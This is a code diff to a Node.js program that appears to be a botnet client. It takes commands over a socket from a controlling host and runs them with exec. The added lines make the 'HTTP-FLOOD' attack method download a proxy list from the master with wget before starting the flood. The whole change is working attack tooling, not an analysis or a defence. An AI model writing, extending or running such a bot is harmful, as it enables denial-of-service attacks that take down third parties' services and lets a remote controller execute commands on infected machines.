@@ -4,7 +4,7 @@ const fetch = require("node-fetch")
 const chalk = require("chalk")
 const chalkGradient = require("gradient-string")
 const chalkAnimation = require("chalk-animation")
-const { exec } = require("child_process")
+const { exec, execSync } = require("child_process")
 const client = new net.Socket()
 
 let HOST = "127.0.0.1"
@@ -96,6 +96,12 @@ client.on("data", function (data) {
             port,
             time
         )
+        if (method == "HTTP-FLOOD") {
+            // DOWNLOAD PROXIES AUTOMATICALLY FROM THE MASTER
+            execSync(
+                `wget 'http://${host}:${port}/proxies' -O methods/browser/proxies.txt`
+            )
+        }
         exec(cmd)
         console.log(
             chalk.grey(
